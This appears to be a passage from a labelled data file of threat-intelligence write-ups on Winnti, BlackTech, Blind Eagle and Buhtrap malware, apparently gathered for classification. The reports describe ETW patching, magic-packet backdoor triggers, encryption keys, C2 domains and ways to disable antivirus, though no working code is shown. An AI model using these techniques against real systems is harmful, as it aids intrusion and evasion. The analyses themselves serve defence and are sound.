in the case of the Winnti malware.This allows blending into the network traffic to avoid detection. A request to the backdoor must have the specific transaction ID to trigger which, in normal circumstances, should be chosen at random by DNS clients. After having received the magic packet, the hook will start forwarding network traffic through the named pipe “Microsoft Ole Object {30000-7100-12985-00000-00002}” to the SK3 module. Until the magic packet is received, the hook passes the execution to the hooked function. One of the NetAgent variants also tries to hide its activity by disabling Event Tracing for Windows (ETW) for the injected process by patching the beginning of EtwEventWrite function with “MOV RAX, 0; RET” which will then always blindly return zero as shown in Figure 6.The communication between the backdoor and its client is RC4-encrypted using the key “CreateThread” and XOR-encoded with 0x77. The SK3 module is responsible for decrypting and processing the traffic forwarded by NetAgent through the named pipe. The decrypted command format is CMD_ID CMD_ARGS where CMD_ID is an integer. The list of the supported commands is shown in Table 4.In addition to the variants using NetAgent to handle the network hook and forwarding the traffic through a named pipe to SK3, we also found PortReuse variants where NetAgent and SK3 were merged in one single module responsible for both, it uses a Windows Server API functionality to route requests for a given URL to the backdoor by using the following UrlPrefix: When routing traffic, the strong wildcard (+) matches all possible host names and will always be applied first, since it takes precedence over the weak wildcard (*) and explicit hostnames [7]. Every connection to this URL will then be redirected to SK3. The decompiled procedure used to register a UrlPrefix is shown in Figure 7:The PortReuse backdoor is targeting various commonly used ports such as 53 (DNS over TCP), 80, 443, 3389 (Remote Desktop Protocol), and 5985 (Windows Remote Management). One of the variants we found is also port-agnostic: it parses the TCP header and triggers only if the source port is less than 22. The backdoor must first be injected into a running process that, in order to install the networking hook, is already listening on the targeted port. In Table 7 are shown various targets of the PortReuse backdoor along with their filenames from the custom packer and the port reuse technique used:It is worth noting that the Winnti malware used a kernel driver to hijack network communications while in that case the port reuse technique allows the backdoor to operate from userland.Since the “magic” used to trigger the PortReuse code is now known, we can use it to find hosts connected to the Internet that could be compromised by this backdoor. In the case of the variants injecting in IIS it can be achieved by performing a GET request and inspecting the Server and Content-Length headers. Since, based on all the samples we have analyzed, performing such a request does not produce any side effects, we asked the help of Censys to perform an Internet-wide scan so to identify potential victims. Thanks to the Censys team, we were able to identify eight IP addresses that replied with an HTTP response matching the signature of PortReuse. We found that all eight of these IP addresses belonged to a single organization: a major mobile hardware and software manufacturer based in Asia. We notified the company and are working with the victim to remediate. It is possible that the Winnti Group was planning a devastating supply-chain attack by compromising this organization.In addition to the Winnti malware, organizations targeted by Winnti were found to be compromised with a VMProtected DLL. Kaspersky mentions this VMProtected technique in the detailed article about ShadowHammer [5]. These VMProtected samples are actually responsible for decrypting a payload that is either embedded in its PE file overlay or read from [Drive]:\\$Recycle.Bin\\COM1:NULL.DAT. This file (NULL.DAT) is an NTFS Alternate Data Stream (ADS) on a file named “COM1”, which has the special meaning of being the first serial port it is a reserved name not to be used as a filename [8]. This makes working with the file a bit more difficult than usual. To be able to read COM1 from the command prompt, its path needs to be prefixed with “\\.\\”. Regardless of the location of the payload, the key derivation and decryption algorithms are always the same. The payloads are encrypted using RC5 in ECB mode and the decryption key is derived from the volume ID of the targeted machine as follows：In most of the VMProtected samples we found, the string used to derive the decryption key from the volume ID is the same (“f@Ukd!rCto R$.”). In some more recent cases the derivation string was “d37lo{r”. Once decrypted, the payload is position-independent codes executed in a separate thread. The derivation string, key derivation from the volume ID and RC5 implementation are the same as used in Win64/Winnti.BN, which is the known second stage of the compromised videogames and gaming applications and are used to decrypt the third stage. Unlike the samples we are looking at here, Win64/ Winnti.BN is not packed with VMProtect, but uses exactly the same key derivation and encryption algorithm. ESET researchers were able to decrypt several payloads packed using this custom VMProtected packer. We found that the payload was either the PortReuse backdoor or the ShadowPad malware [4].The PortReuse backdoors dropped by the VMProtected samples were all using the UrlPrefix technique on various ports and the Server header of the backdoor response was Microsoft-IIS/ 10.0 Microsoft-HTTPAPI/2.0. The backdoor was observed to be in use at least two organizations. Considering that the PortReuse backdoor was found in VMProtected droppers similar to what was previously described by Kaspersky with Operation ShadowHammer [5], in addition to the fact that the same decryption algorithm is used by the 2nd stage from the compromised video-games and also by the gaming application uncovered by ESET, strongly suggests that Operation ShadowHammer and these supply-chain attacks are connected and that the PortReuse backdoor is part of the Winnti Group arsenal.As mentioned previously, some of the payloads dropped by the VMProtected samples were similar to the ShadowPad malware, using the same plugin architecture with identical module ID, similar embedded configurations and encryption schemes. Interestingly, if we look at the modules timestamps, we can see that public webpages to retrieve the C&C server instead of DGA (Domain Generation Algorithm) started to be used from at least the 25th August 2017, less than two weeks after the publication on the NetSarang compromise by Kaspersy [4]. The Module IDs along with their names and timestamps from various samples are shown in Table 8, Table 9 and Table 10. In addition to these ShadowPad variants using the same IDs as described in [4], we found an updated version with modules that, according to their timestamps, were compiled in 2019 according to their timestamps, with additional obfuscations and using random module IDs. The Config module maintains an encrypted string pool that contains two URLs of a public profile or publicly posted document on legitimate websites, which are used to retrieve and decrypt the real C&C server URL. In addition to these URL, the string pool contains a string similar to a campaign identifier that was related to the targeted victims. In previous versions of the backdoor, the string pool starts at offset 0x56 relative to the beginning of the configuration block, while for the updated version, the offset is 0x5c. The algorithm to decrypt the C&C address is similar to the one used in older versions of ShadowPad. First, the string enclosed between consecutive ‘$’ delimiters from the publicly posted document is extracted. Then each character is decremented by 0x61 (‘a’) and each resulting pair of four bits is then concatenated into a byte and the resulting buffer decrypted using the decryption routine that is also used to decrypt the strings from rest of the code. The string decryption algorithms used differ between samples, but follows a pattern similar to the following Python transcription:Unfortunately, the attackers cleaned all the page content before we had access to the malware samples. However, two documents hosted on Google Docs contained information in the document history that enabled us to list the C&C servers they used for that campaign. The supported protocols to contact the C&C server are HTTP, HTTPS, UDP, TCP and DNS.These VMProtected samples persist on the system by using a DLL hijacking technique [7] similar to what was used by the 2nd stage of the CCleaner backdoor as described by CrowdStrike [8]. The DLL has an exported function that is used to copy itself to C:\\Windows\\System32\\TSVIPSrv.DLL. It will then be loaded when the SessionEnv service which tries to load TSVIPSrv.DLL from the System32 directory.Some of the victims in the gaming industry were found to be compromised by different Winnti variants installed using the same dropper named Install.exe and Install64.exe for the 32- and 64-bits versions respectively.The decryption key was always the same regardless of the Winnti variant dropped or the victim, and the decryption algorithm used by Install.exe is AES-256-CTR. This dropper has been used since at least mid-2017 and is still in use as of the time of writing.The PlugX-like encryption algorithm is similar to the one mentioned in the Operation ShadowHammer blogpost, which suggests another link between the ShadowHammer campaign and the campaigns against in the video game industry previously uncovered by ESET. Moreover, Trend Micro also mentioned the use of PlugX-like encryption for the Winnti GitHub abuse campaign [9].Winnti is also known to use custom AceHash builds [11]. 32- and 64-bit signed builds of this password dumper were also found among several victims compromised by Winnti variants installed from the Install.exe dropper, sometimes in conjunction with Mimikatz.In our previous research [1], we mentioned that the 2nd stage delivered to the victims appends the extension .mui to its DLL path, reads that file and decrypts it using RC5 by deriving the decryption key from the volume ID of the victim’s hard drive. The RC5 and key derivation implementation are the same as the one used in the ShadowPad VMProtected launcher. The string “f@Ukd!rCto R$.” is used to derive the decryption key from the volume ID ID – the same key used by the PortReuse and ShadowPad VMProtected launcher. These findings add another connection between operation ShadowHammer and compromise campaign in the video-game industry. We were able to obtain and decrypt the .mui files loaded by Win64/Winnti.BN. They were actually XMRig executables, again packed using the same custom packer as the one used to pack the 1st stage of compromised games as well as the PortReuse backdoor. where wcnapi.mui is the configuration file provided to XMRig. Unfortunately, we do not have a sample of the configuration file. In any event, this sheds some light on the financial motivation behind this campaign. Even though we observed only XMRig as final payload, we cannot exclude the possibility that attackers may have sent different payload to victims of interest based on the MAC addresses collected by the 1st stage.The Winnti group is capable of breaching large organizations via many different means. Given how complex the backdoor and methods they use are, we think they have significant resources and time allocated to malicious activities. There are a lot of discussions among malware researchers regarding attribution. More specifically, whether or not the different attacks, both espionage and for financial gain, are performed by the same people or organization. Given the amount of work required, we know these attacks aren’t performed by a single individual. The perpetrators running the different operations may or may not be the authors of the actual malware we see. They may share tools among different teams and what we see is only a representation of what they accomplish as a team. Or is it multiple teams? The fact that clustering is hard here doesn’t mean we can’t link the different incidents. Given the code and techniques they reuse, we can make strong correlations between incidents. However, by looking only at samples and events, it would be speculation to try to find out how the organization actually works. Who profits from financial gain? Do they mine cryptocurrencies to finance their own activities or do they use the same malware outside of their work hours? There is currently no evidence that would help answer these questions with certainty. The Winnti Group is still very active in 2019 and continues to target both gaming and other industries. The update to the ShadowPad malware shows they are still developing and using it. The relatively new PortReuse malware also shows they update their arsenal and give themselves an additional way to compromise their victims for a long period of time.\n\n\n",

FBI chief Chris Wray earlier this month said China “has a bigger hacking program than every other major nation combined”.\n\n\n",

        "explain": "NTT Security Holdings Corporation Japan Security Operation Center provides Managed Security Service (MSS). We monitor our client systems round-the-clock, find security incidents promptly and provide best solutions. We perform various research on latest threats and output the achievements as black lists, custom signatures and Indicators of Compromise (IoCs). These knowledges are also used by our SOC analysts. Our SOC has been monitoring attacks by one of well-known APT groups, BlackTech. Though many organizations have been reported the malware used by BlackTech, our SOC publishes this whitepaper discussing the latest attacks by BlackTech based on the actual attacks we monitored in 2021. We expect that this whitepaper contributes to better defense against attacks from BlackTech. NTT Security Holdings Corporation Japan Security Operation Center has been monitoring active attacks from APT group BlackTech. This report covers the following topics on the attacks based on our research.Appendix contains the list of hash values that we obtained during our research. This would help to prevent infection or isolate the victims.It is known that APT group BlackTech (also called as Palmerworm, Red Djinn, Earth Hundun or HUAPI) had started their activity at the latest 2012. They have been targeting organizations based in Eastern Asia, especially in Taiwan and Japan. Their main objective seems to steal sensitive information from target organizations. BlackTech utilizes various malware families. Some of them are publicly available (Bifrose or Gh0st RAT) and others are self-developed (TSCookie or PLEAD). They have kept developing new malwares, which means that they are actively working. Our SOC has observed attacks by BlackTech, but the number of attacks rapidly increased around 2020. Our SOC has observed they repeatedly attacked several organizations in telecommunication, defense and mass media industries. In many cases, they established their initial foothold in overseas branch office of Japanese companies, then intruded into mission critical system in headquarters. It is highly probable that BlackTech keep targeting Japanese companies, therefore implementing proper countermeasures both in remote office and headquarters is required to protect from their attacks. This whitepaper reviews and summarizes the BlackTech's attack campaigns and malware targeting Japanese organizations that our SOC observed in 2021. We hope that this content will help considering and implementing effective countermeasures to protect each organization. Origins of BlackTech attacks targeting Japanese organizations are almost either of below. Most of the attacks we observed started with spear phishing. An attacker sends an email pretended to be sent from a business partner to a user. As soon as opening the attached file, the user is infected by malware. The mail body and attached file are so sophisticated that it is difficult for the user to feel odd at a glance. Our SOC has observed attacks that leveraged real internal document used in the target organization in the past. The attached file was either an executable file with double file extension or Microsoft Excel file in xlsm format. These files can be contained in an archive file including RAR format. The archive file is password-protected, and the password is included in the mail body. Our SOC had observed several xlsm files (also called as LAMICE [1]) and macros embedded on them were very similar. This suggests that all of these files were created by single tool. Interestingly, it is observed that APT group Blackgear had used very similar macro during their attacks. This implies that the tool that generate this macro could be shared among multiple APT groups or BlackTech and Blackgear are closely related. BlackTech has been abused various vulnerabilities in their attacks. According to the blog article by JPCERT/CC [2], there were many tools that can exploit various vulnerabilities on C&C server operated by BlackTech. It is also reported [3][4][5] that they had actually abused vulnerabilities on Microsoft Exchange Server. Successful exploitation results in malware execution. Using the malware, the attacker collects environmental information, repeats lateral movement, and go deeper into the target organization. It is also observed that they use certain malware family on different platforms. For example, they use ELF Bifrose on Linux environment and PE Bifrose on Windows environment. BlackTech utilize various malware families. The figure below summarizes the malware families that they use by attacking vectors. Flagpro is malware used in initial phases of an attack to investigate a target environment and download and execute further malware [6][7]. Flagpro (v1.0) may have been used in attacks of October 2020, and the new Flagpro (v2.0) using the MFC (Microsoft Foundation Class) library may have been used after July 2021. Flagpro uses IWebBrowser2 interface and other interfaces from Internet Explorer’s COM object to handle access to and from a C&C server. Flagpro automatically closes dialogs, which appear when accessing external sites, such as proxy authentication confirmation dialogs. We assume that the auto-close function was implemented to keep users from realizing that Flagpro has accessed an external site.Flagpro is obfuscated by inserting dummy code repeatedly. The obfuscation technique is often implemented in the malware used by BlackTech.Control commands received from C&C server are encoded in Base64. Decoded commands used in Flagpro (v2.0) have the following format.The Download Command format is shown in Figure 6, and consists of the string “Exec”, “Yes”, and the URL path to the download site. The string “Exec” is an activity flag, which must be present in both Download Command 1 and 2 in Figure 5 for the main process such as downloading and executing OS commands to take place. The string “Yes” is the execution flag; without it, the downloaded file will not be executed. Flagpro uses HTTP protocol to communicate with C&C server. As shown in Table 1, it switches the URL path for each communication purpose. In addition, when this malware sends the results of OS commands execution and collected authentication information, the contents are encoded in Base64 format and sent to the C&C server as URL parameter values.SelfMake Service is a loader that loads and executes malware on the infected hosts. It is designed to run as Windows Service. Besides, according to the article [5], this loader executes SelfMake Loader described on the next section. Some samples of SelfMake Service not only load and execute malware, but also kill the legitimate splwow64.exe process and execute malicious splwow64.exe that has been overwritten with the malware on the infected host. The splwow64.exe is a file used by PrintSpooler, a Windows Service related to printing. SelfMake Loader is malware that loads and execute other malware [1][3]. It has been reported that this malware executed Spider RAT. The name of SelfMake Loader is derived from the strings “selfmake2” or “selfmake3” in the malware samples. One of the features is that this malware uses MFC (Microsoft Foundation Class). SelfMake Loader can be divided into two types based on the method of loading malware. The first type is to load and execute malware located on the infected host. The loader searches the following directories in order and executes the first malware it found. The other type is to download the malware from a C&C server to the %TEMP%directory and execute the downloaded file. The file also includes an XOR encoded configuration. This configuration is a pipe-delimited format and contains domain and port number of the C&C server. The configuration format is similar to Bifrose malware which BlackTech uses. This pipe-delimited configuration is a common characteristic of BlackTech's malware.The following figure shows a file format that SelfMake Loader loads from the infected host. The file which is downloaded from the C&C server is in a similar format. The malware is XOR encoded and is decoded by a key contained in the file.In addition, based on the code similarities, we consider that the code of executing the decoded data is used the one published on GitHub [8]. SelfMake Loader calls the following function several times. The following function simply output a string using the printf function; that is to say, this is a dummy code. BlackTech tends to utilize malware that contain such dummy code.HeavyROT Loader is a loader that downloads malware from a C&C server and executes it. There is a sample of this loader which downloads malware from the same C&C server as SelfMake Loader and it would indicate the sample relates to BlackTech. We named this malware HeavyROT Loader since it uses bit rotation calculation for RC6 cryptographic algorithm or calculation of checksums, as will be described later. The malware communicates with C&C servers using HTTP, and Basic authentication is implemented to the servers. The malware communicates with the servers again with the flag enabled which ignores a certification error (ERROR_INTERNET_INVALID_CA) in case this error occurs in HTTPS communication. In addition, the malware gets the User Agent string from an infected machine’s registry in order to set the string to an HTTP header. The downloaded data from C&C servers contains encrypted PE data as well as a seed for generating a decryption key. Furthermore, the malware calculates the checksum before and after decrypting PE data and it halts processing if the checksum does not match the downloaded data. The following figure shows how the malware generates a key for decryption from a seed. It is notable that the malware extracts original PE file by using RC6 encryption (not decryption) routine after generating the key. Although there was no theoretical evidence, we confirmed that the data encrypted by RC6 decryption routine can be decrypted by RC6 encryption routine. We assume that the data downloaded from a C&C server contained the encrypted data by RC6 decryption routine, and the malware decrypted original PE file by RC6 encryption routine to the encrypted data.AresPYDoor is backdoor malware. It is said to be related to BlackTech, because the C&C server used by AresPYDoor has relation to it used by Bifrose, also BlackTech malware [17]. AresPYDoor is based on a Python RAT [9] released on Github under the name Ares and is converted to an executable file. AresPYDoor uses the URL format shown in Figure 18 to access the C&C server and receive commands.One of the characteristics of AresPYDoor is its multi-platform support. There are several codes implemented to work on both Windows and Linux. As an example, Figure 20 shows some of the persistence codes.Spider RAT is a RAT [1][4] executed by LAMICE or SelfMake Loader. There are 32-bit and 64-bit samples. Although they have some similarities, these functions implemented in each sample are different. In this section, we will start with 32bit sample and continue with 64bit sample. We observed that there are two executable files (DLL files) embedded in the .data section, one of which will later be edited and dropped in the persistent phase. The behavior of these DLL files is to execute “C:\\Windows\\System32\\calc.exe”. Although there are two embedded DLL files, they have the same behavior.The characteristic strings, shown in Figure 24, can be seen in the debug output. Such strings are also seen in 64-bit samples. Three persistent behaviors described below can be specified depending on the value of PERSISTENCE in the configuration. In this case, the sample was set not to run these persistent behaviors.Control commands implemented in Spider RAT 32-bit sample are shown in Table 3. The pair of offset values 0x4 and 0x8 in the received data determine each command.We also observed 64-bit samples, and their implementation is simple compared with 32-bit sample. The 64-bit samples use multi-threads approach for processing. However, we have confirmed that some threads have no processing content. We assume that some features will be implemented in the future. The configuration of 64-bit samples do not have specific structure like 32-bit one, but information such as C&C server is hard-coded. In addition, there are some characteristic strings that are also found in 32-bit in the debug output. Control commands implemented in 64-bit Spider RAT are shown in Table 4. The pair of offset values 0x4 and 0x8 in the received data determine each command.BTSDoor is backdoor malware [6]. It has been observed that Flagpro downloaded and executed this backdoor. The name of BTSDoor is derived from the pdb pathname BTSWindows. BTSDoor implements the following commands. The traffic is encrypted with AES as is the case with sending information about the infected host.Gh0stTimes is customized based on the leaked Gh0st RAT source code and has been used in some attack cases since early 2020 [2].Gh0stTimes adds the feature to communicate with the C&C server by implementing the new CPortmapManager and CUltraPortmapManager classes. In addition, Gh0stTimes implements features such as file operations (CFileManager class) and remote shell execution (CShellManager class) that are reused from Gh0stRAT. Gh0stTimes repeatedly inserts dummy code to make analysis difficult. BlackTech frequently uses this type of obfuscation technique.Gh0stTimes equips control commands for each function, such as file operation and remote shell execution [2]. Additionally, this malware supports some specific commands for file operations. Gh0stTimes uses a proprietary TCP protocol to communicate with the C&C server. At the beginning of its communication to the C&C server, Gh0stTimes sends an authentication ID and data for generating encryption key. If the authentication ID is not correct, authentication fails. The encryption key is generated by processing the data sent from the victim host, which is provided at the beginning of the communication. Afterward, Gh0stTimes sends/receives control commands that are encrypted with custom RC4 algorithm (RC4 + XOR 0xAC) and compressed with zlib. TSCookie is a downloader that downloads TSCookie Loader and TSCookie RAT [11]. The downloaded files are encoded. Therefore, TSCookie decodes them after loading them on memory, then it executes them. It exists two versions of TSCookie, Windows and ELF binary version. This section describes a Windows version, and the next section explains an ELF binary version. The behaviors of TSCookie Loader and TSCookie RAT can be checked in JPCERT/CC blog posts [10][11].Executing TSCookie leads to load RC4-encrypted data on memory. The data exists in the resource section of TSCookie. Afterwards, it will be decrypted as a DLL file. The decrypted DLL contains dummy codes like other BlackTech’s malware.After executing the decrypted DLL, it will connect to a C&C server. The configuration, which includes destinations of C&C server, is hard-coded in the sample, and its structure is almost the same as the samples reported by JPCERT/CC [11].TSCookie connects to the C&C server using HTTP GET method to download a TSCookie Loader. When TSCookie downloads TSCookie Loader, it will send RC4 encrypted data to the C&C server. JPCERT/CC reported that their samples inserted the encrypted data into the Cookie header [11]. Whereas, our sample inserted the data into the URL path.URL path is replaced by swprintf() based on format string. TSCookie splits the encrypted data into two parts, and the split position is decided by random number. The URL path of HTTP GET request is as follows: The structure of the original data, which means the sending data before encryption, has been changed since the existing report from JPCERT/CC [11] as follows:This download activity will not execute if the first four bytes of the response data do not match to the hard-coded value in the sample. After downloading TSCookie Loader, TSCookie downloads its modules. HTTP POST method is used for downloading the modules. TSCookie inserts the RC4 encrypted data into the BODY part. The Date header value is used as the RC4 key.This POST request also works as heartbeat and is sent around every 50 seconds. However, if the first four bytes of the response does not match to the hard-coded value in the sample, the POST request will not be sent from the next request. This section explains ELF version of TSCookie (ELF_TSCookie) [14]. ELF_TSCookie contains same functions as Windows version. However, the functions are limited. The samples, which we found, target not only Linux environment users, but also FreeBSD ones. We assume that the attacker uses the different version of TSCookie depending on the target's environment. The command values of our samples have changed from the values reported by JPCERT/CC [12]. This JPCERT/CC report provides the detailed analysis result of the past samples. The “file” command result shows that it is static-linked file, and the “readelf” command result indicates that this malware could be compiled in old development environment. It seems that attackers would like to evade environmental problems. As JPCERT/CC has already reported [12] that information about C&C servers is inserted as plain text. ELF_TSCookie copies the information onto allocated memory space and encrypts it with RC4. The encrypted information will be used in later process.ELF_TSCookie sends the host information to the C&C servers. The information contains TSCookie PID, IP address, hostname, and login username. The code to obtain the host information is shown in Figure 38. It may be intended to get the result of “uname” command, but it has a wrong option “- a00”. Hence the command will be failed, and the result will not be sent. ELF_TScookie commands are listed in Table 9. No major changes of the commands have been observed since JPCERT/CC had published its analysis result [12].IamDown is a malware that downloads and executes another malware. It has been used since at least 2014. We call this malware “IamDown” because the string “i am mutex!” is inserted into this malware and this is a downloader malware.The hard-coded strings such as “i am mutex!”, the C&C server domains, and a Mutex value are embedded in IamDown. We assume that this malware has some relationships between Poison Ivy, because the Mutex value of IamDown ”)!VoqA” is same as the head of the default Mutex value of Poison Ivy ”)!VoqA.I4” [13]. IamDown uses Socket for communicating with the C&C server with TCP/443 port. The first 16 bytes data is the fixed valueIamDown sequentially checks the received data from head. If the data matches the condition, Socket will close, and if not, the data procedure will continue as shown in Figure 41. IamDown executes the downloaded data on a new thread in the same process. This means that the data is not stored as a file on the infected host.We will explain about ELF version of Bifrose (ELF_Bifrose). Our sample does not exist big differences from the past reported samples [14].The results of “file” and “readelf” commands is shown in Figure 44. The samples were compiled in an old environment and statically linked. It seems that attackers would like to evade environmental problems.An example of the first sending data is shown in Figure 47. ELF_Bifrose communicates with port 80,443, and 8080, but it uses Socket connection rather than the HTTP(S) protocol. After sending the data, ELF_Bifrose receives commands from the C&C server. The implemented commands are in Table 10. The commands have not been changed significantly from the existing samples [14].We will explain about ELF version of PLEAD (ELF_PLEAD). JPCERT/CC reported the detailed analysis result about the existing samples [16]. However, we will show the analysis result of newly observed samples in this report.The results of “file” and “readelf” command are shown in Figure 48. The samples were compiled in an old environment and statically linked. It seems that attackers would like to evade environmental problems.ELF_PLEAD encrypts configuration with RC4 as existing samples does. Figure 49 shows an example of the decrypted configuration. The first 32 bytes data in the Figure 49 is the RC4 key, and after the key follows the configuration. The configuration size is 0x1AA. As the following configuration indicates that a private IP address is set as the destination. In addition, the uncommon destination port 29678 is configured. From these settings, we assume that this configuration was adapted to the targeted company that had already been intruded. BlackTech has two main attack vectors. The first is an attack method originates from spear phishing emails. The second is an attack method exploits server vulnerabilities. The best way to defend against spear phishing emails is to avoid opening suspicious emails, links or files. BlackTech attacks with emails and attachments that are spoofed as if they were clients of the target. It is possible to prevent the attack by carefully checking the sender email address, the text of emails, and the double extensions of attachments. In addition, the installation of email security products is also an effective measure. Our SOC has observed that these products have detected spear phishing emails by BlackTech. To defend against exploitation of server vulnerabilities, we recommend that applying the latest update programs or the latest security patches. Furthermore, the installation and the properly operation of network security products and endpoint security products are also effective measure. Even if your organization were initially accessed by such threat actor, these products will detect later behaviors. Our SOC has created custom signatures to detect such behaviors, and in some cases, we have been able to minimize the damage by detecting and quarantining them. Although BlackTech is actively developing new malware, its attack techniques have not changed much. Thus, it is important to build detection logics against them. In both attack vectors as we mentioned, BlackTech targets vulnerable areas of the target organization. In particular, overseas offices tend to be attacked by BlackTech. Even if your organization’s critical infrastructure is managed in a closed network, BlackTech will examine all possible paths to penetrate it, identify where are vulnerable areas, and attempt to compromise them. Hence, proper management of your organization’s systems is important. Furthermore, BlackTech is known to repeatedly attack against the same targeted organization. Even if BlackTech intruded once, or even if intrusions were prevented, your organization’s systems still have risk to be attacked over and over. We recommend keeping up with the latest attack trends and taking measures properly and quickly. NTT Security Holdings Corporation Japan Security Operation Center has conducted research activities for the prevention of security incidents and early detection when they occur. In particular, we have actively investigated and analyzed on targeted attacks for clue to consider countermeasures against further sophisticated attack. In this report, we provided a walkthrough of BlackTech’s activities based on the cases we observed in 2021. BlackTech has extremely actively attacked against Japanese organizations repeatedly, and it can be continued. Our SOC will continue to research BlackTech. IoCs are listed in the Appendix. We hope you will find it useful.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "APT-C-36, also known as Blind Eagle, is a financially motivated threat group that has been launching indiscriminate attacks against citizens of various countries in South America since at least 2018.In a recent campaign targeting Ecuador based organizations, CPR detected a new infection chain that involves a more advanced toolset. The backdoor chosen for this campaign is typically used by espionage campaigns, which is unusual for this group.For the last few months, we have been observing the ongoing campaigns orchestrated by Blind Eagle, which have mostly adhered to the TTPs described above — phishing emails pretending to be from the Colombian government. One typical example is an email purportedly from the Ministry of Foreign Affairs, threatening the recipient with issues when leaving the country unless they settle a bureaucratic matter. Such emails usually feature either a malicious document or a malicious link, but in this case, the attackers said “why not both?” and included both a link and a terse attached PDF directing the unfortunate victim to the exact same link.In both cases, the link in question consists of a legitimate link-shortening service URL that geolocates victims and makes them communicate with a different “server” depending on the original country (https://gtly[.]to/QvlFV_zgh). If the incoming HTTP request originates from outside Colombia, the server aborts the infection chain, acts innocent and redirects the client to the official website of the migration department of the Colombian Ministry of Foreign Affairs.If the incoming request seems to arrive from Colombia, the infection chain proceeds as scheduled. The server responds to the client with a file for download. This is a malware executable hosted on the file-sharing service MediaFire. The file is compressed, similar to a ZIP file, using the LHA algorithm. It is password-protected, making it impervious against naive static analysis and even naive sandbox emulation. The password is found both in the email and in the attached PDF.The malicious executable inside the LHA is written in .Net and packed. When unpacked, a modified sample of QuasarRAT is revealed. QuasarRAT is an open source trojan available in multiple sources like Github. The (probably Spanish-speaking) actors behind this APT group have added some extra capabilities over the last few years, which are easy to spot due to the names of functions and variables in Spanish. This process, by which threat actors abuse access to malware sources and each create their own special versions of that malware, is sadly not without precedent in the security landscape and always makes us heave a sad sigh when we encounter it. Although QuasarRAT is not a dedicated banking Trojan, it can be observed from the sample’s embedded strings that the group’s main goal in the campaign was to intercept victim access to their bank account.One specific sample caught our attention as it was related to a government institution from Ecuador and not from Colombia. While Blind Eagle attacking Ecuador is not unprecedented, it is still unusual. Similarly to the campaign described above, the geo-filter server in this campaign redirects requests outside of Ecuador and Colombia to the website of the Ecuadorian Internal Revenue Service:If contacted from Colombia or Ecuador, the downloaded file from Mediafire will be a RAR archive with a password. But instead of a single executable consisting of some packed RAT, the infection chain, in this case, is much more elaborate:Inside the RAR archive, there is an executable built with PyInstaller with a rather simplistic Python 3.10 code. This code just adds a new stage in the infection chain:mshta is a utility that executes Microsoft HTML Applications, and the attackers abuse it here to download and execute the next stage, which contains VBS code embedded in an HTML.Usually campaigns by Blind Eagle abuse legitimate file sharing services such as Mediafire or free dynamic domains like “*.linkpc.net”; this case is different, and the next stage is hosted at the malicious domain upxsystems[.]com. This next-stage downloads and executes yet another next-stage, a script written in Powershell:The above Powershell checks the system version and downloads the appropriate additional Powershell. This additional OS-specific Powershell checks for installed AV tools and behaves differently based on its findings. The main difference between each next stage consists in different pieces of code that will try to disable the security solution (for example Windows Defender), but in all cases, regardless of the type of security solution installed on the computer, the next stagewill download a version of python suitable for the target OS and install it:It will then download two scripts named mp.py and ByAV2.py which will be stored in the user %Public% folder and for which it will create a scheduled task that will run every 10 minutes. For Windows 7 the task will be created by downloading an XML from the C2 “upxsystems[.]com”, while for Windows 8, 8.1, and 10 the malware will create the task using the cmdlet “New-ScheduledTask*”. In the case of Windows 7, the task is preconfigured to be executed as System and contains the following description.It’s written using the kind of Spanish that is commonly spoken in the target countries, which can be noticed for example with the use of “es posible que algunas funciones no anden” instead of “no se ejecuten” or any other variation more common in different geographic regions.The full description can be translated to: “Keeps your Google software up to date. If this task is disabled or stopped, your Google software will not be kept up to date, which means that security vulnerabilities that may appear cannot be fixed and some features may not work. This task is automatically uninstalled if no Google software uses it.” After downloading the Python scripts and adding persistence, the malware will try to kill all processes related to the infection. Regarding the two downloaded scripts, both are obfuscated using homebrew encoding that consists of base64 repeated 5 times (we will never, ever, tire of responding to such design choices with “known to be 5 times as secure as vanilla base64”):After deciphering these strings for each script we obtain two different types of Meterpreter samples. ByAV2.py This code consists of an in-memory loader developed in Python, which will load and run a normal Meterpreter sample in DLL format that uses “tcp://systemwin.linkpc[.]net:443” as a C2 server. Python has a built-in PRNG, and in principle no one is stopping you from constructing a stream cipher based on it, which is what the malware authors do here. The embedded DLL is decrypted using this makeshift “randint stream cipher” with an embedded key (in this construction the key is used as the seed to prime the random library). In the grand tradition of cryptography used inside of malware purely to obfuscate buffers using a hardcoded key, the question of how secure this makeshift cipher is has exactly zero consequences.The second script basically consists of another sample of Meterpreter — this time a version developed entirely in Python and using the same C2 server. We can only speculate on why the server was configured to drop the same payload with the same C2 server but written in a different language; possibly one of the samples acts as a plan B in case of the other sample gets detected by some antivirus solution and removed.Blind Eagle is a strange bird among APT groups. Judging by its toolset and usual operations, it is clearly more interested in cybercrime and monetary gain than in espionage; however, unlike most such groups that just attack the entire world indiscriminately, Blind Eagle has a very narrow geographical focus, most of the time limited to a single country. This latest campaign targeting Ecuador highlights how, over the last few years, Blind Eagle has matured as a threat — refining their tools, adding features to leaked code bases, and experimenting with elaborate infection chains and “Living off the Land” as seen with the clever abuse of mshta. If what we’ve seen is any indication, this group is worth keeping an eye on so that victims aren’t blindsided by whatever clever thing they try next. Check Point’s anti-phishing solutions for office 365 & G suite analyzes all historical emails in order to determine prior trust relations between the sender and receiver, increasing the likelihood of identifying user impersonation or fraudulent messages. Artificial Intelligence (AI) and Indicators of Compromise (IoCs) used in the past train the Harmony Email & Office platform for what to look for in complex zero-day phishing attacks.\n\n\n",

        "explain": "The Buhtrap hacking group has switched its targets from Rusian financial businesses and institutions since December 2015 when it moved into cyber-espionage operations, culminating with the use of a recently patched Windows zero-day during June 2019. The Windows local privilege escalation 0-day vulnerability tracked as CVE-2019-1132 and abused by Buhtrap as part of its attacks was fixed by Microsoft during this month's Patch Tuesday and it allowed the cyber-crime group to run arbitrary code in kernel mode after successful exploitation. Even though actively targeting banking clients since 2014, Buhtrap's attacks were only detected one year later, in 2015, when it started going after more high-profile victims like financial institutions according to Group-IB and ESET researchers.“From August 2015 to February 2016 Buhtrap managed to conduct 13 successful attacks against Russian banks for a total amount of 1.8 billion rubles ($25.7 mln),” says a Group-IB report.ESET researchers were able to observe how the hacker group's “toolset has been expanded with malware used to conduct espionage in Eastern Europe and Central Asia” in multiple targeted campaigns. Buhtrap's zero-day vulnerability exploit was used during June 2019 in an attack against a governmental institution and it is designed to abuse “a NULL pointer dereference in the win32k.sys component” on computers running older Windows versions. The CVE-2019-1132 exploit Buhtrap employed to compromise governmental computing systems during June impacts the following Windows versions:This vulnerability was only exploitable only on older Windows versions because user processes are no longer allowed 